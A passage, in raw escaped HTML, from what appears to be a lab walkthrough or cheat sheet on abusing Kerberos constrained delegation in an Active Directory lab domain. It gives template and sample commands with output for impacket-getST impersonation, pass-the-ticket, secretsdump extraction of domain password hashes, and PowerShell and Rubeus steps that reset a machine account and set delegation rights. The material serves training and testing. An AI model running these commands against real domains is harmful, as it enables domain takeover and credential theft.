Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -hashes :&amp;lt;NEW_HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;DC_HOSTNAME&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s DC.REDELEGATE.VL &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;redelegate.vl/FS01$&amp;#39;&lt;/span&gt; -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.129.31.186 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting TGT for user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#39; -k -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;#39;&amp;lt;SPN&amp;gt;&amp;#39; -impersonate &amp;#39;&amp;lt;DC_HOSTNAME&amp;gt;&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s DC.REDELEGATE.VL &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-getST &lt;span class=&#34;s1&#34;&gt;&amp;#39;redelegate.vl/FS01$&amp;#39;&lt;/span&gt; -k -no-pass -dc-ip 10.129.31.186 -spn &lt;span class=&#34;s1&#34;&gt;&amp;#39;ldap/dc.redelegate.vl&amp;#39;&lt;/span&gt; -impersonate &lt;span class=&#34;s1&#34;&gt;&amp;#39;DC&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Impersonating DC&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2self&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Requesting S4U2Proxy&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Saving ticket in DC@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5-secrets-dump&#34;&gt;5. Secrets Dump&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Pass-the-ticket&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;export KRB5CCNAME=&amp;lt;CCACHE&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass &amp;lt;DC&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s 10.129.234.50 &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-secretsdump -k -no-pass DC.REDELEGATE.VL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;---[SNIP]---&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Cleaning up...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34;&gt;&lt;h4 id=&#34;1-control-of-a-machine-account&#34;&gt;1. Control of a Machine Account&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Set-ADAccountPassword -Identity &amp;#34;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#34; -Reset -NewPassword (ConvertTo-SecureString &amp;#34;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#34; -AsPlainText -Force)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\Helen.Frost\Documents&amp;gt; Set-ADAccountPassword -Identity &amp;#34;FS01$&amp;#34; -Reset -NewPassword (ConvertTo-SecureString &amp;#34;Fall2024!&amp;#34; -AsPlainText -Force)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-set-msds-allowedtodelegateto-to-target-spn&#34;&gt;2. Set msDS-AllowedToDelegateTo to Target SPN&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Set-ADObject -Identity &amp;#34;CN=&amp;lt;TARGET_MACHINE&amp;gt;,CN=COMPUTERS,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -Add @{&amp;#34;msDS-AllowedToDelegateTo&amp;#34;=&amp;#34;&amp;lt;SPN&amp;gt;&amp;#34;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\Helen.Frost\Documents&amp;gt; Set-ADObject -Identity &amp;#34;CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL&amp;#34; -Add @{&amp;#34;msDS-AllowedToDelegateTo&amp;#34;=&amp;#34;ldap/dc.redelegate.vl&amp;#34;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;3-set-trusted_to_authenticate_for_delegation-flag&#34;&gt;3. Set TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION Flag&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Set-ADAccountControl -Identity &amp;#34;&amp;lt;TARGET_MACHINE&amp;gt;$&amp;#34; -TrustedToAuthForDelegation $True&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;*Evil-WinRM* PS C:\Users\Helen.Frost\Documents&amp;gt; Set-ADAccountControl -Identity &amp;#34;FS01$&amp;#34; -TrustedToAuthForDelegation $True&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;4-request-a-ticket&#34;&gt;4. Request a Ticket&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\rubeus.exe asktgt /user:&amp;lt;TARGET_MACHINE&amp;gt;$ /password:&amp;lt;NEW_PASSWORD&amp;gt; /domain:&amp;lt;DOMAIN&amp;gt; /nowrap /ptt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;evil-winrm-py PS C:\programdata&amp;gt; .\rubeus.exe asktgt /user:FS01$ /password:Password123! /domain:redelegate.vl /nowrap /ptt&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;   ______        _                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  (_____ \      | |                     &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;   _____) )_   _| |__  _____ _   _  ___ &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  |_|   |_|____/|____/|_____)____/(___/&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;  v2.3.3 &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Action: Ask TGT&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Building AS-REQ (w/ preauth) for: &amp;#39;redelegate.vl\FS01$&amp;#39;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] Using domain controller: 10.129.31.186:88&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] TGT request successful!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[*] base64(ticket.kirbi):&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;      doIFYjCCBV6gAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAg---[SNIP]---ypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDXJlZGVsZWdhdGUudmw=&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[+] Ticket successfully imported!&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;  ServiceName              :  krbtgt/redelegate.vl&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  ServiceRealm             :  REDELEGATE.VL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  UserName                 :  FS01$ (NT_PRINCIPAL)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  UserRealm                :  REDELEGATE.VL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  StartTime                :  11/1/2025 5:04:27 AM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  EndTime                  :  11/1/2025 3:04:27 PM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  RenewTill                :  11/8/2025 4:04:27 AM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  KeyType                  :  rc4_hmac&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  Base64(key)              :  l5+tzy6qN7IkOHE3SkGfAQ==&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  ASREP (key)              :  2B576ACBE6BCFDA7294D6BD18041B8FE&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;5-request-a-service-ticket&#34;&gt;5. Request a Service Ticket&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;.\rubeus.exe s4u /ticket:&amp;lt;BASE64_TICKET&amp;gt; /impersonateuser:&amp;lt;DC_HOSTNAME&amp;gt;$ /domain:&amp;lt;DOMAIN&amp;gt; /msdsspn:&amp;lt;SPN&amp;gt; /dc:&amp;lt;DC&amp;gt; /ptt /nowrap&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;evil-winrm-py PS C:\programdata&amp;gt; .\rubeus.exe s4u /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEdzCCBHNhggRvMIIEa6ADAg---[SNIP]---ypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDXJlZGVsZWdhdGUudmw= /impersonateuser:DC$ /domain:redelegate.vl /msdsspn:ldap/dc.redelegate.vl /dc:dc.redelegate.vl /ptt /nowrap&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;   ______        _                      &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;  